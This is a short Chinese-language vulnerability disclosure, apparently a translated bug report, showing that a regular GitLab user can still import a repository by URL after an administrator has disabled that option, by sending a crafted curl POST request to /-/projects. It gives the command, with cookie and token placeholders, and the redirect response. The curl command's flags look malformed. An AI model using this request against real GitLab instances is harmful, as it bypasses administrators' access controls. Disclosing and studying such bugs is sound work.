## 背景 

ngalog于2019年提交了这个漏洞: 作为管理员，可以在admin页面`https://:gitlab_instance/admin/application_settings`利用URL Project Creation禁用Repo;

然而，用户仍然可以利用url使用repo导入项目.

## 复现步骤 

1.作为一个管理员,通过URL导入禁用Repo是在`/admin/application_settings/general`下面的` Visibilityandaccess controls`

![](../Images/14c39aac6eb949df8741a2e2233b9781.png)

2.作为普通用户，执行如下curl命令:

```
curl 'http://gitlab.local/-/projects'
 \'Content-Type: application/x-www-form-urlencoded'
 \"Cookie: $COOKIE"
 \"utf8=%E2%9C%93&authenticity_token=$VALID_AUTHENTICITY_TOKEN&project%5Bimport_url%5D=https%3A%2F%2Fgitlab.com%2Fgitlab-org%2Frelease-cli.git&project%5Bimport_url_user%5D=&project%5Bimport_url_password%5D=&project%5Bci_cd_only%5D=false&project%5Bname%5D=Importing+Even+If+Disabled&project%5Bnamespace_id%5D=7&project%5Bpath%5D=importing-even-if-disabled&project%5Bdescription%5D=&project%5Bvisibility_level%5D=0"


```

这个命令发送的请求相当于在UI界面中使用`Repo by URL`导入方法时所发生的事情。它将通过URL导入`gitlab-org/release-cli`项目,得到的响应如下:

```
<html><body>You are being <a href="http://gitlab.local/attacker/importing-even-if-disabled"
>redirected</a>.</body></html> 
```

发现项目被导入。
